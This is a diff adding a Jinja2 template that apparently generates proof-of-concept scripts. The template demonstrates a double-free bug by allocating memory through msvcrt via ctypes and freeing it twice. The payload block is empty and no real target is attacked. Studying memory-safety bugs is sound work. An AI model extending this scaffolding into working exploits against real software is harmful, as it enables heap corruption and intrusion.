@@ -1,0 +1,45 @@
+{% extends "poc/base.py.j2" %}
+
+{% block description %}Double-free vulnerability{% endblock %}
+
+{% block config %}
+ALLOC_SIZE = {{ alloc_size | default(256) }}
+{% endblock %}
+
+{% block payload %}
+# Double-free requires specific call sequence
+payload = b''
+{% endblock %}
+
+{% block exploit_doc %}Execute double-free exploit{% endblock %}
+
+{% block exploit_body %}
+        print(f"[*] Free API: {{ sink_api }}")
+
+        # Use msvcrt for allocation
+        msvcrt = ctypes.CDLL("msvcrt")
+        malloc = msvcrt.malloc
+        malloc.restype = ctypes.c_void_p
+        malloc.argtypes = [ctypes.c_size_t]
+        free = msvcrt.free
+        free.argtypes = [ctypes.c_void_p]
+
+        # Step 1: Allocate
+        print(f"[*] Allocating {ALLOC_SIZE} bytes...")
+        ptr = malloc(ALLOC_SIZE)
+        print(f"[+] Allocated at: 0x{ptr:x}")
+
+        if not ptr:
+            print("[!] Allocation failed")
+            return False
+
+        # Step 2: First free
+        print("[*] First free...")
+        free(ptr)
+        print("[+] First free completed")
+
+        # Step 3: Double-free!
+        print("[!] Attempting double-free...")
+        free(ptr)
+        print("[!] Double-free completed (may have corrupted heap)")
+{% endblock %}
